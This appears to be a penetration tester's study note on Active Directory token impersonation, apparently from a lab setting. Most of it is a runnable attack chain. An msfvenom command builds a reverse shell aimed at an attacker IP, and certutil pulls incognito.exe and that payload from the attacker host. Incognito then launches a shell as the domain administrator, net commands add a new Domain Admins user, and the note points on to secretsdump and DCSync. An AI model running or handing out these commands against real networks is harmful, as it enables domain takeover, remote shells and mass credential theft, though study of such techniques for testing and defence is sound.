-- -
A user may have access to delegate tokens to be able to impersonate another user or system in AD. We can try to list out available delegate tokens for one or more users and see if it allows us to move laterally or vertically using a delegate token
##### Definition
Tokens are temporary keys that allow you to access a system/network resource w/o having to provide credentials each time you access something. Like a cookie for computers in AD. 
#### Types:
- Delegate - created for logging into a machine/RDP. **Target**
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script. 
##### Steps
1. Get shell on machine
2. List Tokens
3. Impersonate another user (domain admin)
4. Add new user to new group (domain admins)
5. Compromise DC
### "manual" exploit
If you don't have `incognito.exe`, then you can find a precompiled version [here](https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe) or to compile from source, the repo is [here](https://github.com/milkdevil/incognito2?tab=readme-ov-file).
#### Prepare rev shell
You will get an impersonation elevated shell using this reverse shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attack ip> LPORT=9001 -a x64 --platform Windows -f exe -o shell.exe
```
#### File transfer
File transfer over the executables onto the victim Windows host
```powershell
certutil -urlcache http://<attack ip>/incognito.exe incognito.exe
certutil -urlcache http://<attack ip>/shell.exe shell.exe
```
#### Impersonation attack
Make sure to have a netcat listener listening on `9001` or whatever LPORT you set on the rev shell.
```powershell
# list available dleegate tokens
incognito.exe list_tokens -u

# create impersonation reverse shell
incognito.exe execute -c "<domain>/<user>" .\shell.exe
incognito.exe execute -c "MARVEL/administrator" .\shell.exe
```
Now go to the below section "Post-Impersonate" for creating yourself a user in Domain Admins group or other group or other exploit. 
#### resource
- Vector outlined here: [Juggernaut exploit steps](https://juggernaut-sec.com/lateral-movement-token-impersonation/#Impersonating_the_Domain_Admin_with_incognitoexe)
- [Code your own](https://www.insecure.in/blog/token-impersonation-without-metasploit)
### Metasploit Impersonate
#### Get Shell
[[metasploit]]
![[metasploit#^66f29a]]
#### Impersonate User
[[metasploit]]
![[metasploit#^c51a79]]

### Post-Impersonate
#### Add new user to domain admins
obviously, you can add the user to whatever group the user has
```powershell
# Create new user and add to the current domain
net user /add <new username> <new password> /domain
nnet user /add hawkeye Password1@ /domain

# Add new user to desired group, in this case domain admins
net group "<domain group>" <user> /ADD /DOMAIN
net group "Domain Admins" hawkeye /ADD /DOMAIN
```
#### Compromise
From here, you have another account to play with, so loop back to other attacks:
[[Dark Arts/Active Directory/Post Breach/Attacks/Kerberoasting|Kerberoasting]]
[[Dark Arts/Mitigations/Active Directory/Pass Attacks|Pass Attacks]]
[[Dark Arts/Active Directory/Post Breach/Attacks/Token Impersonation]]

If you add the new user to domain admins, you can try to get all a password dump of the entire domain using [[Dark Arts/Active Directory/Post Breach/Tools/Attacks/secretsdump|secretsdump]] or DCSync or whatever you want. 